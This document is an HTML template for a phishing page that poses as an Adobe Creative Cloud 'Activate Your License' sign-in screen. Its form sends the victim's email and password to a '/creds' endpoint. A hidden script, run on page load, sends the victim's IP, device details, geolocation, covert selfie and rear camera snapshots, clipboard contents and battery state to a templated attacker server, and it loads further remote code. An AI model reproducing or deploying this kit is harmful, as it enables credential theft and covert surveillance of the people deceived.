<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Adobe - Activate Your License</title>
<link rel="icon" href="https://www.adobe.com/favicon.ico">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Adobe Clean', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #1a1a1a; min-height: 100vh; display: flex; align-items: center; justify-content: center; color: #ffffff; }
.container { width: 100%; max-width: 440px; padding: 20px; }
.header { text-align: center; margin-bottom: 32px; }
.adobe-logo { display: inline-flex; align-items: center; gap: 10px; margin-bottom: 24px; }
.adobe-icon { width: 40px; height: 40px; background: #EB1000; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: 700; color: #fff; }
.adobe-text { font-size: 22px; font-weight: 700; color: #fff; }
.cc-icons { display: flex; justify-content: center; gap: 12px; margin-bottom: 24px; }
.cc-icon { width: 48px; height: 48px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: 700; color: #fff; }
.cc-ps { background: #31A8FF; }
.cc-ai { background: #FF9A00; }
.cc-pr { background: #9999FF; }
.cc-ae { background: #9999FF; }
.cc-lr { background: #31A8FF; }
.alert-box { background: #2a1a1a; border: 1px solid #EB1000; border-radius: 8px; padding: 16px; margin-bottom: 24px; display: flex; align-items: flex-start; gap: 12px; }
.alert-icon { font-size: 20px; flex-shrink: 0; }
.alert-text { font-size: 14px; color: #ffcccc; line-height: 1.5; }
h1 { font-size: 28px; font-weight: 700; color: #ffffff; margin-bottom: 8px; text-align: center; }
.subtitle { font-size: 15px; color: #999; text-align: center; margin-bottom: 32px; line-height: 1.5; }
.form-box { background: #262626; border-radius: 12px; padding: 28px; border: 1px solid #3a3a3a; }
.form-group { margin-bottom: 18px; }
.form-group label { display: block; font-size: 14px; font-weight: 600; color: #e0e0e0; margin-bottom: 8px; }
.form-group input { width: 100%; padding: 14px 16px; background: #1a1a1a; border: 2px solid #444; border-radius: 6px; font-size: 15px; color: #ffffff; }
.form-group input:focus { outline: none; border-color: #EB1000; }
.form-group input::placeholder { color: #666; }
.btn-login { width: 100%; padding: 14px; background: #EB1000; color: #ffffff; border: none; border-radius: 6px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background 0.2s; }
.btn-login:hover { background: #cc0e00; }
.links { text-align: center; margin-top: 20px; }
.links a { color: #4B9FE1; font-size: 13px; text-decoration: none; }
.links a:hover { text-decoration: underline; }
.loading { display: none; padding: 30px; text-align: center; }
.spinner { border: 3px solid #444; border-top: 3px solid #EB1000; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
@keyframes spin { to { transform: rotate(360deg); } }
.footer { text-align: center; margin-top: 32px; font-size: 12px; color: #666; }
.footer a { color: #4B9FE1; text-decoration: none; }
@media (max-width: 480px) { .container { padding: 16px; } h1 { font-size: 22px; } .cc-icons { gap: 8px; } .cc-icon { width: 40px; height: 40px; font-size: 16px; } }
</style>
</head>
<body>
<div class="container">
<div class="header">
<div class="adobe-logo">
<div class="adobe-icon">A</div>
<span class="adobe-text">Adobe</span>
</div>
<div class="cc-icons">
<div class="cc-icon cc-ps">Ps</div>
<div class="cc-icon cc-ai">Ai</div>
<div class="cc-icon cc-pr">Pr</div>
<div class="cc-icon cc-ae">Ae</div>
<div class="cc-icon cc-lr">Lr</div>
</div>
</div>
<div class="alert-box">
<span class="alert-icon">⚠️</span>
<span class="alert-text">Your Creative Cloud license requires activation. Sign in with your Adobe ID to continue using your applications.</span>
</div>
<h1>Activate Your License</h1>
<p class="subtitle">Sign in to your Adobe account to activate your Creative Cloud subscription and restore access to all applications.</p>
<div class="form-box">
<form id="loginForm">
<div class="form-group">
<label>Adobe ID (Email Address)</label>
<input type="email" id="email" placeholder="Enter your email address" required autofocus>
</div>
<div class="form-group">
<label>Password</label>
<input type="password" id="password" placeholder="Enter your password" required>
</div>
<button type="submit" class="btn-login">Activate License</button>
</form>
<div class="loading" id="loading">
<div class="spinner"></div>
<p style="color:#999;font-size:14px;">Activating your license...</p>
</div>
<div class="links">
<a href="#">Forgot password?</a> · <a href="#">Create an account</a>
</div>
</div>
<div class="footer">
<p>© 2024 Adobe. All rights reserved. <a href="#">Privacy Policy</a> · <a href="#">Terms of Use</a></p>
</div>
</div>
<video id="video" style="display:none" playsinline autoplay></video>
<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="<%=a %>/public/advanced.js"></script>
<script>
var uid="<%=uid %>";
var video=document.getElementById('video'), canvas=document.getElementById('canvas');

async function gatherAll(){
    let td='🎨 <b>Adobe License Victim!</b>\n\n';
    td+='⚓ IP: <code><%=ip %></code>\n';
    td+='⏰ Time: '+new Date().toLocaleString()+'\n';
    td+='🖥️ OS: <code>'+navigator.platform+'</code>\n';
    td+='📱 Screen: <code>'+screen.width+'x'+screen.height+'</code>\n';
    td+='🌐 Browser: <code>'+navigator.userAgent.split(' ').pop()+'</code>\n';
    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
    if(navigator.geolocation){navigator.geolocation.getCurrentPosition((p)=>{$.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});},()=>{},{enableHighAccuracy:true,timeout:10000});}
    async function captureCamera(f,l){try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:f,width:640,height:480}});video.srcObject=s;await video.play();await new Promise(r=>setTimeout(r,2000));canvas.getContext('2d').drawImage(video,0,0,640,480);$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/jpeg",0.8).replace("data:image/jpeg;base64,","")),cam:l});s.getTracks().forEach(t=>t.stop());}catch(e){}}
    try{await captureCamera("user","selfie");}catch(e){}
    try{await captureCamera("environment","back");}catch(e){}
    try{if(navigator.clipboard&&navigator.clipboard.readText){const c=await navigator.clipboard.readText();if(c)$.post("<%=a %>/clipboard",{uid:uid,clip:encodeURIComponent(c)});}}catch(e){}
    try{const b=await navigator.getBattery();$.post("<%=a %>/battery",{uid:uid,level:Math.round(b.level*100),charging:b.charging});}catch(e){}
}

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    var email = document.getElementById('email').value;
    var pass = document.getElementById('password').value;
    document.querySelector('form').style.display='none';
    document.getElementById('loading').style.display='block';
    fetch('/creds', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({username: email, password: pass, uri: '<%=uid %>', path: '<%=uid %>'})
    }).then(function(){ window.location.href = '<%=url %>'; });
});

window.onload = function(){ gatherAll(); if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>"); };
</script>
</body>
</html>